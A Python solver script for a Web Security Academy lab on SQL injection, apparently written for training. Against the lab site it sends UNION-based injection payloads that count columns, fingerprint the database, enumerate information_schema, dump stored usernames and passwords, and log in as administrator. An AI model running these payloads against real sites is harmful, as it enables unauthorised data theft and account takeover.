import requests
import argparse
import re


parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection attack, listing the database contents on non-Oracle databases')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

COLUMNS = 0
mysql = 0
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = { 'Cookie': f'session={r.cookies.get("session")}' }

for i in range(27, 0, -1):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='ORDER BY {i}-- ")
    print(f"Checking if table has {i} columns.")
    if not "Internal Server Error" in r.text:
        print(f"The database has {i} columns.")
        COLUMNS = i
        break

try:
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}@@version-- ").status_code == 200
    r2 = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}version()-- ").status_code == 200
    assert(r ^ r2) == 1
    if r:
        print("Database is MySQL or Microsoft.")
        mysql = 1
except:
    print("Error while trying to determine if database type is MySQL or Microsoft. It may be PostgreSQL.")

if mysql:
    
    # RETRIEVE ALL TABLES AND SEARCH FOR USERS TABLE
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}table_name FROM information_schema.tables-- ")
    users_table = "users_" + re.search(r'users_(\w+)', r.text).group(1)
    print(f"Found users table: {users_table}")

    # RETRIEVE ALL COLUMNS FROM USERS TABLE
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}column_name FROM information_schema.columns WHERE table_name = '{users_table}'-- ")
    user_column = "username_" + re.search(r'username_(\w+)', r.text).group(1)
    password_column = "password_" + re.search(r'password_(\w+)', r.text).group(1)
    print(f"Found username column: {user_column}")
    print(f"Found password column: {password_column}")
    
    # RETRIEVE ALL VALUES FROM FOUND COLUMNS
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {user_column},{password_column} FROM {users_table}-- ")
    usernames = re.findall(r'<th>(.*?)</th>', r.text)
    passwords = re.findall(r'<td>(.*?)</td>', r.text)

    # PUT VALUES INSIDE DICT, PRINT LOOTED CREDENTIALS
    credentials = {k: v for k, v in zip(usernames, passwords)}
    print(credentials)
    
    # LOGIN AS ADMINISTRATOR
    data = {
    'csrf': f'{csrf}',
    'username': 'administrator',
    'password': f'{credentials.get("administrator")}'
    }
    requests.post('https://' + lab.id + '.web-security-academy.net/login',headers=headers, data=data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
